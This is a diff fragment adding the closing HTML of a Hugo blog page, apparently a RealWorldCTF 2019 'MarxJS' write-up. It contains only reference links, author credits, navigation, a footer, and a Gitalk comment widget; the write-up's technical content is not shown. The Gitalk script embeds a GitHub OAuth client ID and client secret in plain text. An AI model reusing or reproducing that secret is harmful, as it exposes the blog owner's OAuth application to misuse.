+<li><a href="https://xz.aliyun.com/t/7237">本人在2019年对一些NodeJS问题的研究</a></li>
+<li><a href="https://unit.nginx.org/configuration/#">Unit Configuration</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2020/03/realworldctf-2019-marxjs/>https://syang-ng.github.io/2020/03/realworldctf-2019-marxjs/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2020/03/eurosys-2019-lockdoc/" class="prev" rel="prev" title="EuroSys 2019 LockDoc"><i class="iconfont icon-left"></i>&nbsp;EuroSys 2019 LockDoc</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+          
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: '10b807dd4496d773d0b9',
+    clientSecret: 'c5fe75039eb62db59ca9181aa20ebb0a9a73a1fc',
+    repo: 'syang-ng.github.io',
+    owner: 'syang-ng',
+    admin: ['syang-ng'],
+    id: location.pathname, 
+    distractionFreeMode: false 
+  });
+  (function() {
+    if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+      document.getElementById('gitalk-container').innerHTML = 'Gitalk comments not available by default when the website is previewed locally.';
+      return;
+    }
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2020</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
